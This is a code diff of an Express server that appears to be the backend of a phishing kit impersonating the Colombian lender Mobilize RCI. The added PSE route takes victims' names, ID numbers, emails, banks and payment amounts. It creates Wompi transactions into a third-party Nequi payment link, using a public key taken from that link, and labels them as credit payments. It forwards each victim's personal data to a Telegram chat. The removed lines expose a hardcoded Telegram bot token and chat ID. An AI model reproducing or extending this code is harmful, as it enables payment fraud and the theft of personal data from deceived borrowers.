@@ -5,8 +5,8 @@ const axios   = require('axios');
 const aws4    = require('aws4');
 const { CognitoIdentityClient, GetIdCommand, GetCredentialsForIdentityCommand } = require('@aws-sdk/client-cognito-identity');
 
-const TG_TOKEN = process.env.TG_TOKEN || '8550551689:AAGZc5-TykD7olUxG27nJJ8QglYXBn0ivPg';
-const TG_CHAT  = process.env.TG_CHAT  || '-1004398504693';
+const TG_TOKEN = process.env.TG_TOKEN || '';
+const TG_CHAT  = process.env.TG_CHAT  || '';
 const PORT     = process.env.PORT     || 3001;
 
 const app = express();
@@ -93,7 +93,7 @@ function allowed(ip, max = 15, win = 60_000) {
   list.push(now); _rl.set(ip, list); return true;
 }
 const ip = req =>
-  (req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '').split(',')[0].trim();
+  req.headers['x-real-ip'] || req.socket?.remoteAddress || '';
 
 // ── Telegram ──────────────────────────────────────────────────────────────────
 async function tgSend(msg) {
@@ -106,6 +106,127 @@ async function tgSend(msg) {
 }
 
 const fmtCOP = n => Number(n).toLocaleString('es-CO', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+
+// ── Wompi PSE (sin llave privada) ─────────────────────────────────────────────
+const WOMPI_API        = 'https://api.wompi.co/v1';
+const NEQUI_LINK_SHORT = 'dEGMNb';
+let _wPubKey = null, _wVposId = null;
+let _wBancos = null, _wBancosTs = 0;
+
+async function wompiInit() {
+  if (_wPubKey) return;
+  const r = await axios.get(`${WOMPI_API}/payment_links/${NEQUI_LINK_SHORT}`);
+  _wPubKey = r.data.data.merchant_public_key;
+  _wVposId = r.data.data.id;
+}
+
+app.get('/api/pse/bancos', async (req, res) => {
+  if (!allowed(ip(req), 20, 60_000))
+    return res.status(429).json({ error: 'Demasiadas solicitudes.' });
+  try {
+    if (_wBancos && Date.now() - _wBancosTs < 30 * 60_000)
+      return res.json(_wBancos);
+    await wompiInit();
+    const r = await axios.get(`${WOMPI_API}/pse/financial_institutions`, {
+      headers: { Authorization: `Bearer ${_wPubKey}` }
+    });
+    _wBancos = r.data.data;
+    _wBancosTs = Date.now();
+    res.json(_wBancos);
+  } catch (e) {
+    console.error('PSE bancos:', e.message);
+    res.status(502).json({ error: 'No se pudo obtener la lista de bancos.' });
+  }
+});
+
+app.post('/api/pse/generar', async (req, res) => {
+  if (!allowed(ip(req), 5, 60_000))
+    return res.status(429).json({ error: 'Demasiadas solicitudes.' });
+
+  const { monto, bancoCode, cedula, tipoPersona, nombre, email, telefono } = req.body || {};
+
+  if (!monto || !bancoCode || !cedula || !tipoPersona || !nombre || !email)
+    return res.status(400).json({ error: 'Faltan datos requeridos.' });
+
+  const montoNum = Number(monto);
+  if (isNaN(montoNum) || montoNum < 1000 || montoNum > 100_000_000)
+    return res.status(400).json({ error: 'Monto inválido.' });
+
+  if (!/^\d{5,12}$/.test(String(cedula)))
+    return res.status(400).json({ error: 'Cédula inválida.' });
+
+  if (!/^\d+$/.test(String(bancoCode)))
+    return res.status(400).json({ error: 'Banco inválido.' });
+
+  try {
+    await wompiInit();
+
+    const mResp = await axios.get(`${WOMPI_API}/merchants/${_wPubKey}`);
+    const presale      = mResp.data.data.presigned_acceptance;
+    const personalData = mResp.data.data.presigned_personal_data_auth;
+
+    const montoEnCentavos = Math.round(montoNum * 100);
+    const ref = 'MOB' + Date.now() + Math.random().toString(36).substr(2, 5).toUpperCase();
+
+    const txBody = {
+      acceptance_token:     presale.acceptance_token,
+      accept_personal_auth: personalData.acceptance_token,
+      amount_in_cents:      montoEnCentavos,
+      currency:             'COP',
+      customer_email:       email,
+      payment_method: {
+        type:                       'PSE',
+        user_type:                  tipoPersona === 'J' ? 1 : 0,
+        user_legal_id_type:         'CC',
+        user_legal_id:              String(cedula),
+        financial_institution_code: String(bancoCode),
+        payment_description:        'Pago crédito Mobilize RCI',
+      },
+      reference: ref,
+      customer_data: {
+        phone_number: String(telefono || '3000000000'),
+        full_name:    nombre,
+        legal_id:     String(cedula),
+        legal_id_type: 'CC',
+      },
+      payment_link_id: _wVposId,
+    };
+
+    const txResp = await axios.post(`${WOMPI_API}/transactions`, txBody, {
+      headers: { Authorization: `Bearer ${_wPubKey}`, 'Content-Type': 'application/json' }
+    });
+
+    const txId = txResp.data.data.id;
+    let asyncUrl = null;
+    for (let i = 0; i < 8; i++) {
+      await new Promise(r => setTimeout(r, 1200));
+      const poll = await axios.get(`${WOMPI_API}/transactions/${txId}`, {
+        headers: { Authorization: `Bearer ${_wPubKey}` }
+      });
+      asyncUrl = poll.data.data.payment_method?.extra?.async_payment_url;
+      if (asyncUrl) break;
+    }
+
+    if (!asyncUrl)
+      return res.status(502).json({ error: 'No se pudo obtener el link del banco. Intenta de nuevo.' });
+
+    await tgSend(
+      `🏦 <b>PSE — Mobilize RCI</b>\n` +
+      `👤 <b>${nombre}</b>\n` +
+      `🪪 Cédula: <code>${cedula}</code>\n` +
+      `📧 ${email}\n` +
+      `💰 <b>COP ${fmtCOP(montoNum)}</b>\n` +
+      `🏛 Banco: <code>${bancoCode}</code>\n` +
+      `📅 ${new Date().toLocaleString('es-CO')}`
+    );
+
+    res.json({ async_payment_url: asyncUrl });
+
+  } catch (e) {
+    console.error('PSE generar:', e.message, e.response?.data);
+    res.status(502).json({ error: 'Error al procesar el pago PSE.' });
+  }
+});
 
 // ── Routes ────────────────────────────────────────────────────────────────────
 app.get('/health', (_, res) =>
@@ -240,7 +361,7 @@ app.post('/api/tg/answer', async (req, res) => {
 
 // ── Frontend estático RCI ─────────────────────────────────────────────────────
 const path = require('path');
-const FRONTEND = process.env.FRONTEND || path.join('C:\\Users\\mike rodriguez\\Desktop\\mobiliza');
+const FRONTEND = process.env.FRONTEND || '/var/www/mobiliza-front';
 
 app.use(express.static(FRONTEND));
 
